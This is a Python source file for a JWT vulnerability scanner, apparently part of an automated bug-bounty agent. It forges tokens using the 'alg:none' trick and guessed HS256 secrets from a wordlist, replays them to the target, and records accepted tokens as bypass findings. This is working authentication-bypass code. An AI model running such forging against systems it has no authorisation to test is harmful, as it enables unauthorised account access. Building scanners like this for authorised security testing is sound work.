"""
Implements: Section 7.13 -- jwt_scanner.py
Blueprint: bb_agent_v6.6_final_blueprint.md

TWO OF THREE NAMED TECHNIQUES BUILT; RS256->HS256 CONFUSION FLAGGED AS
A REAL, OPEN GAP -- INVESTIGATED, NOT SKIPPED SILENTLY (docs/
DECISIONS.md item 95 has the full reasoning): Section 7.13 names three
techniques. `alg:none` and weak-secret guessing are self-contained --
both only need the token already found (see "SELF-CONTAINED JWT
DISCOVERY" below) and a candidate value to try. RS256->HS256 confusion
fundamentally requires knowing the target's RSA PUBLIC key (to use as
the forged token's HMAC secret) -- that requires JWKS-endpoint
discovery (parsing `/.well-known/jwks.json` or equivalent, extracting
and formatting key material), a genuinely separate sub-problem this
project has no infrastructure for yet. Not attempted with a guessed or
hardcoded key: unlike weak-secret guessing (where a curated wordlist of
commonly-reused literal secrets is well-established, real-world
practice), there is no comparable "commonly-reused RSA public key"
list to draw from -- inventing one would be guessing at infrastructure,
not implementing a documented technique.

PyJWT ADDED AS A REAL DEPENDENCY (`requirements.txt`), NOT HAND-ROLLED
-- A DIFFERENT CALL THAN THE YSOSERIAL DECISION (item 86), REASONED
THROUGH SEPARATELY, NOT DEFAULTED FROM PRECEDENT: PyJWT is a boring,
standard encode/decode library -- the JWT equivalent of `httpx` for
HTTP -- not an exploit-generation tool. It provides no "attack"
capability of its own; this file still decides what claims to forge,
which algorithm-confusion technique to attempt, and which secrets to
try. Chosen over hand-rolling base64url/HMAC-SHA256 specifically to
avoid subtle encode/decode correctness bugs a battle-tested library
wouldn't have. Verified directly before adding the dependency: `jwt.
encode`/`get_unverified_header`/`decode` round-tripped against real
HS256 tokens, confirming a weak-secret guess that matches the real
signing secret produces a token that verifies successfully against
that secret -- not assumed from the library's documentation alone.

SELF-CONTAINED JWT DISCOVERY -- A REAL, DOCUMENTED LIMITATION OF THIS
SCANNER'S SCOPE, NOT A HIDDEN ASSUMPTION: `scan(target_url: str)` has
no way to receive an existing valid JWT as input (the same test-account/
session gap already flagged for the "Batch 7" scanners -- idor/bac/
auth_scanner/business_logic -- applies here too, in miniature). This
scanner works around it by treating `target_url` as a candidate
token-issuing endpoint: it fetches `target_url`, searches the response
body and `Set-Cookie` header for a JWT-shaped string (three dot-
separated base64url segments), and validates the match by actually
attempting to decode it (filters out coincidental dotted text that
merely LOOKS JWT-shaped -- verified directly against both a real token
and deliberately non-JWT dotted strings before trusting the regex
alone). If no JWT is found, `scan()` returns `[]`.

REPLAY TARGET IS `target_url` ITSELF -- AN IMPERFECT BUT HONEST
APPROXIMATION, FLAGGED RATHER THAN OVERSOLD: real JWT testing typically
forges a token from one endpoint and replays it against a SEPARATE
protected resource. This scanner has no way to know a distinct
protected-resource URL, so it replays the forged token back to
`target_url` itself via `Authorization: Bearer <forged>` and requires
the UNAUTHENTICATED baseline to already be 401/403 before counting
anything as a bypass (the same "baseline must show it's actually gated
before an alternate can prove a bypass" shape `api_versioning.py`, item
92, already established) -- if `target_url` is purely a token-issuing
endpoint with no auth gate of its own, baseline won't be 401/403 and
this scanner correctly finds nothing, rather than manufacturing a false
signal.

WEAK-SECRET GATED ON THE DISCOVERED TOKEN'S OWN `alg` BEING `HS256`:
re-signing with a guessed secret is only a meaningful test of "is the
HMAC secret weak" if the token was HMAC-signed to begin with;
`alg:none` is attempted regardless of the original algorithm, since
that vulnerability class doesn't depend on which algorithm the original
token used.

`ExploitCandidate.parameter = None` -- A SEVENTH EXTENSION TO ITEM 69'S
LIST, FOUND HERE, NOT ASSUMED FROM CORS/HOST-HEADER'S PRECEDENT: this
technique injects via the `Authorization` HTTP header, the same
no-single-parameter shape CORS's `Origin` header and Host Header's
`Host` header already have -- not `auth_scanner.py`'s own "Auth" case
(a different, not-yet-built scanner, Section 7.27), a distinct finding
for this specific scanner.
"""

from __future__ import annotations

import json
import re
from pathlib import Path

import jwt

from core.ontology.findings import ExploitCandidate
from core.scanners.base_scanner import BaseScanner
from core.scanners.registry import register

PAYLOAD_FILE = Path(__file__).resolve().parent.parent.parent / "data" / "payloads" / "jwt_payloads.json"
RAW_RESPONSE_SNAPSHOT_CHARS = 512  # Section 10.7's call_target() convention
JWT_SHAPE_PATTERN = re.compile(r"[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+")
UNAUTHORIZED_STATUS_CODES = frozenset({401, 403})


def _load_payloads(path: Path = PAYLOAD_FILE) -> list[dict]:
    """Loads and returns the `payloads` array from `jwt_payloads.json`."""
    data = json.loads(path.read_text(encoding="utf-8"))
    return data["payloads"]


def _find_jwt(response) -> str | None:
    """Searches `response`'s body and `Set-Cookie` header for a
    JWT-shaped string, validated by an actual decode attempt -- see
    module docstring's "SELF-CONTAINED JWT DISCOVERY" note.

    Args:
        response: The `httpx.Response` to search.

    Returns:
        The first substring that both matches the JWT shape AND
        successfully decodes as one, or `None`.
    """
    haystacks = [response.text, response.headers.get("set-cookie", "")]
    for haystack in haystacks:
        for match in JWT_SHAPE_PATTERN.finditer(haystack):
            candidate = match.group(0)
            try:
                jwt.get_unverified_header(candidate)
                jwt.decode(candidate, options={"verify_signature": False})
            except jwt.exceptions.DecodeError:
                continue
            return candidate
    return None


@register("jwt_scanner")
class JWTScanner(BaseScanner):
    """Section 7.13. See module docstring for the self-contained
    discovery mechanism and the RS256->HS256 gap."""

    def __init__(self, session, *, payloads: list[dict] | None = None) -> None:
        """
        Args:
            session: See `BaseScanner`.
            payloads: See `xss_scanner.XSSScanner`.
        """
        super().__init__(session)
        self._payloads = payloads if payloads is not None else _load_payloads()

    async def scan(self, target_url: str) -> list[ExploitCandidate]:
        """See module docstring.

        Args:
            target_url: See `BaseScanner.scan`.

        Returns:
            `[]` if no payload entries are loaded, no JWT is found in
            `target_url`'s response, or the unauthenticated baseline
            isn't itself 401/403. Otherwise one `ExploitCandidate` per
            technique whose forged token was accepted.
        """
        if not self._payloads:
            return []

        baseline = await self.session.request("GET", target_url)
        discovered_token = _find_jwt(baseline)
        if discovered_token is None:
            return []
        if baseline.status_code not in UNAUTHORIZED_STATUS_CODES:
            return []

        header = jwt.get_unverified_header(discovered_token)
        payload = jwt.decode(discovered_token, options={"verify_signature": False})

        candidates: list[ExploitCandidate] = []

        for entry in self._payloads:
            if entry["technique"] != "alg_none":
                continue
            forged = jwt.encode(payload, key="", algorithm="none")
            accepted, probe_response = await self._probe(target_url, forged)
            if accepted:
                candidates.append(self._candidate(target_url, "alg_none", forged, probe_response.text))

        if header.get("alg", "").upper() == "HS256":
            for entry in self._payloads:
                if entry["technique"] != "weak_secret":
                    continue
                secret = entry["secret"]
                forged = jwt.encode(payload, secret, algorithm="HS256")
                accepted, probe_response = await self._probe(target_url, forged)
                if accepted:
                    candidates.append(
                        self._candidate(target_url, f"weak_secret:{secret}", forged, probe_response.text)
                    )
                    break  # the actual secret was found; no need to keep guessing

        return candidates

    async def _probe(self, target_url: str, forged_token: str) -> tuple[bool, object]:
        """Replays `forged_token` against `target_url` -- see module
        docstring's "REPLAY TARGET IS `target_url` ITSELF" note.

        Args:
            target_url: The endpoint to replay the forged token against.
            forged_token: The forged JWT to send.

        Returns:
            `(accepted, response)` -- `accepted` is `True` only if this
            probe's response status is outside `UNAUTHORIZED_STATUS_CODES`
            (the baseline having already been confirmed 401/403 by the
            caller).
        """
        response = await self.session.request("GET", target_url, headers={"Authorization": f"Bearer {forged_token}"})
        return response.status_code not in UNAUTHORIZED_STATUS_CODES, response

    def _candidate(self, target_url: str, technique: str, forged_token: str, response_text: str) -> ExploitCandidate:
        return ExploitCandidate(
            vuln_type="jwt",
            endpoint=target_url,
            http_method="GET",
            parameter=None,
            detected_by="jwt_scanner",
            payload_used=f"[{technique}] Authorization: Bearer {forged_token}",
            raw_response_snapshot=response_text[:RAW_RESPONSE_SNAPSHOT_CHARS],
            probe_correlation_id=None,
        )
